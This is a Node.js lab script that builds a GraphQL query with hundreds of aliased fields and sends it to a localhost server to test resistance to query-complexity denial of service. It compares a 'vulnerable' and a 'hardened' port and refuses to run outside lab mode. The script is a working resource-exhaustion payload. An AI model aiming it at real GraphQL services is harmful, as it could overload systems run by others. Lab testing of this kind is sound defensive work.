#!/usr/bin/env node
const fetch = require('node-fetch');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');

const argv = yargs(hideBin(process.argv))
  .option('lab', { type: 'boolean', default: false, description: 'Enable lab mode' })
  .option('size', { type: 'number', default: 200, description: 'Query complexity size' })
  .option('port', { type: 'number', default: 4000, description: 'Target port (4000=vulnerable, 4001=hardened)' })
  .argv;
if (!argv.lab && process.env.NODE_ENV !== 'lab') {
  console.log('This script must be run with --lab or NODE_ENV=lab to prevent accidental misuse.');
  process.exit(1);
}

const size = argv.size;
const endpoint = `http://localhost:${argv.port}/graphql`;

let fields = '';
for (let i = 0; i < size; i++) {
  fields += `f${i}: id `;
}

const query = `query Complex { posts { ${fields} } }`;

(async () => {
  const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query }) });
  const json = await res.json();
  console.log('Response (truncated):', JSON.stringify(json).slice(0, 500));
})();
